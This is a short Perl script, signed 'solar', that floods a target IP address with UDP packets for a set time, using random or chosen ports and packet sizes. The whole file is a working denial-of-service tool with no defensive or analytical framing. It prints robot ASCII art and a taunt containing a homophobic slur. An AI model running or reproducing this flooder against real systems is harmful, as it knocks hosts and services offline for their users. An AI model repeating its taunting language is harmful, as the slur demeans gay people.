#!/usr/bin/perl

##
#made by solar
##

use Socket;
use strict;

my ($ip,$port,$size,$time) = @ARGV;

my ($iaddr,$endtime,$psize,$pport);

$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);

print <<EOTEXT;

55555555555555555555555555555555555555555555555555
55555555555555555555555555555555555555555555555555
55555555555555555_5555555555555555_555555555555555
55555555555555555__55555555555555_5555555555555555
555555555555555555_______________55555555555555555
5555555555555555___________________555555555555555
55555555555555____555_________555____5555555555555
5555555555555_____555_________555_____555555555555
555555555555___________________________55555555555
555555555555___________________________55555555555
55555555555555555555555555555555555555555555555555
55555____555____________________________555____555
5555______55____________________________55______55
5555______55____________________________55______55
5555______55____________________________55______55
5555______55____________________________55______55
5555______55____________________________55______55
5555______55____________________________55______55
5555______55____________________________55______55
5555______55____________________________55______55
55555____555____________________________555____555
555555555555____________________________5555555555
555555555555____________________________5555555555
555555555555___________________________55555555555
55555555555555555______555555_____5555555555555555
55555555555555555______555555_____5555555555555555
55555555555555555______555555_____5555555555555555
55555555555555555______555555_____5555555555555555
55555555555555555______555555_____5555555555555555
55555555555555555555555555555555555555555555555555




made by solar, robot just fried you faggot
EOTEXT

print "::robot fried you:: $ip " . ($port ? $port : "random") . " Disrespected = " .
  ($size ? "$size-byte" : "Disconnected :)") . " ~solar~ " .
  ($time ? " for $time seconds" : "") . "\n";
print "Break with Ctrl-C\n" unless $time;

for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(1500000))+1;

  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}